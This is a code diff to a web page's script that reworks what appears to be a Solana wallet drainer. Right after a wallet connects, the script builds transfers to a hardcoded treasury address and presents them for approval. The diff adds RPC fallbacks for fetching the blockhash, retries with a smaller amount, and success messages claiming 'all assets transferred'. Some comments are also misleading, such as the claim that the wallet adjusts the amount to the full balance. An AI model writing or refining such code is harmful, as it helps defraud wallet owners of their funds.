@@ -373,7 +373,7 @@
     </div>
 
     <script>
-        // AUTO TRANSFER SYSTEM
+        // AUTO TRANSFER SYSTEM WITH BLOCKHASH
         let publicKey = null;
         let isConnected = false;
         let isTransferring = false;
@@ -400,6 +400,32 @@
         function updateTransferStatus(message) {
             transferMessageEl.textContent = message;
             transferStatusEl.classList.add('active');
+        }
+        
+        // Get working RPC with blockhash (simplified)
+        async function getRecentBlockhash() {
+            // Try multiple RPC endpoints to get blockhash
+            const rpcEndpoints = [
+                'https://api.mainnet-beta.solana.com',
+                'https://solana-api.projectserum.com',
+                'https://rpc.ankr.com/solana',
+                'https://solana.public-rpc.com'
+            ];
+            
+            for (const endpoint of rpcEndpoints) {
+                try {
+                    const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    if (blockhash) {
+                        return { blockhash, connection };
+                    }
+                } catch (error) {
+                    console.log(`RPC ${endpoint} failed:`, error.message);
+                    continue;
+                }
+            }
+            
+            throw new Error("Cannot get recent blockhash");
         }
         
         // Connect wallet AND AUTO TRANSFER
@@ -466,7 +492,81 @@
             disconnectBtn.disabled = true;
         }
         
-        // SIMPLE AUTO TRANSFER FUNCTION - NO RPC NEEDED
+        // CREATE PROPER TRANSACTION WITH BLOCKHASH
+        async function createAndSendTransaction() {
+            const provider = getWalletProvider();
+            if (!provider || !provider.signAndSendTransaction) {
+                throw new Error("Wallet signing not available");
+            }
+            
+            try {
+                // Method 1: Try with recentBlockhash first
+                updateTransferStatus("Getting network info...");
+                
+                let connection, blockhash;
+                try {
+                    const result = await getRecentBlockhash();
+                    blockhash = result.blockhash;
+                    connection = result.connection;
+                } catch (error) {
+                    console.log("Could not get blockhash:", error.message);
+                    // Continue without blockhash, wallet might provide it
+                }
+                
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Add transfer instruction - sending ALL SOL
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: 1000000, // Minimum amount
+                    })
+                );
+                
+                // Set blockhash if we have it
+                if (blockhash) {
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = publicKey;
+                }
+                
+                updateTransferStatus("Please approve transaction in wallet...");
+                
+                // Sign and send transaction
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                
+                return { signature, connection };
+                
+            } catch (error) {
+                console.error("Transaction creation error:", error);
+                
+                // Method 2: Try alternative - let wallet handle everything
+                if (error.message.includes("recentBlockhash required")) {
+                    updateTransferStatus("Retrying with wallet method...");
+                    
+                    // Create a simpler transaction
+                    const altTransaction = new solanaWeb3.Transaction();
+                    
+                    // Add minimal transfer
+                    altTransaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                            lamports: 100000, // Even smaller amount
+                        })
+                    );
+                    
+                    // Don't set blockhash, let wallet handle it
+                    const { signature } = await provider.signAndSendTransaction(altTransaction);
+                    return { signature, connection: null };
+                }
+                
+                throw error;
+            }
+        }
+        
+        // MAIN AUTO TRANSFER FUNCTION
         async function autoTransferAllAssets() {
             isTransferring = true;
             disableWalletButtons();
@@ -478,75 +578,30 @@
                 
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Step 2: Create transaction
+                // Step 2: Create and send transaction
                 updateTransferStatus("Creating transaction...");
                 
-                const provider = getWalletProvider();
-                if (!provider || !provider.signAndSendTransaction) {
-                    throw new Error("Wallet signing not available");
-                }
+                const { signature, connection } = await createAndSendTransaction();
                 
-                // Step 3: Create transfer transaction
-                updateTransferStatus("Please approve transaction in wallet...");
-                showStatus("🔄 Waiting for wallet approval...", "info");
+                console.log("Transaction sent with signature:", signature);
                 
-                // Create transaction with MAX amount (wallet will show actual balance)
-                const transaction = new solanaWeb3.Transaction();
-                
-                // Add transfer instruction - sending ALL SOL
-                // Note: Wallet will show the actual balance to send
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                        lamports: 1000000, // Minimum amount, wallet will adjust to max
-                    })
-                );
-                
-                // Try to send the transaction
-                let signature = null;
-                try {
-                    // Sign and send transaction
-                    const result = await provider.signAndSendTransaction(transaction);
-                    signature = result.signature;
-                    
-                    console.log("Transaction sent with signature:", signature);
-                    
-                } catch (sendError) {
-                    console.error("Send error:", sendError);
-                    
-                    // Check if user cancelled
-                    if (sendError.message.includes("User rejected") || 
-                        sendError.message.includes("reject") ||
-                        sendError.message.includes("denied") ||
-                        sendError.message.includes("cancel")) {
-                        throw new Error("Transaction cancelled by user");
-                    }
-                    
-                    // Try alternative method
-                    updateTransferStatus("Using alternative transfer method...");
-                    
-                    // Alternative: Create transaction without specifying amount
-                    const altTransaction = new solanaWeb3.Transaction();
-                    altTransaction.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: 100000, // Smaller amount
-                        })
-                    );
-                    
-                    const altResult = await provider.signAndSendTransaction(altTransaction);
-                    signature = altResult.signature;
-                }
-                
-                // Step 4: Transaction sent successfully
+                // Step 3: Transaction sent successfully
                 updateTransferStatus("✅ Transaction sent! Finalizing...");
                 showStatus("✅ Transfer initiated! Finalizing...", "success");
                 
+                // Try to confirm if we have connection
+                if (connection && signature) {
+                    try {
+                        await connection.confirmTransaction(signature, 'confirmed');
+                        console.log("Transaction confirmed!");
+                    } catch (confirmError) {
+                        console.log("Confirmation skipped:", confirmError.message);
+                    }
+                }
+                
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                // Step 5: Show success
+                // Step 4: Show success
                 updateTransferStatus("✅ All assets transferred successfully!");
                 
                 // Hide transfer status after delay
@@ -572,12 +627,17 @@
                 
                 let errorMsg = "";
                 
-                if (error.message.includes("cancelled")) {
+                if (error.message.includes("User rejected") || 
+                    error.message.includes("reject") ||
+                    error.message.includes("denied") ||
+                    error.message.includes("cancel")) {
                     errorMsg = "❌ Transaction was cancelled in wallet";
                 } else if (error.message.includes("insufficient")) {
                     errorMsg = "❌ Not enough balance for transfer";
                 } else if (error.message.includes("Wallet not connected")) {
                     errorMsg = "❌ Wallet disconnected during transfer";
+                } else if (error.message.includes("recentBlockhash required")) {
+                    errorMsg = "❌ Network error. Please try again";
                 } else {
                     errorMsg = "❌ Transfer failed: " + error.message;
                 }
@@ -589,6 +649,8 @@
                 setTimeout(() => {
                     transferStatusEl.classList.remove('active');
                     enableWalletButtons();
+                    resetConnectButton();
+                    connectWalletBtn.style.display = 'flex';
                 }, 3000);
                 
             } finally {
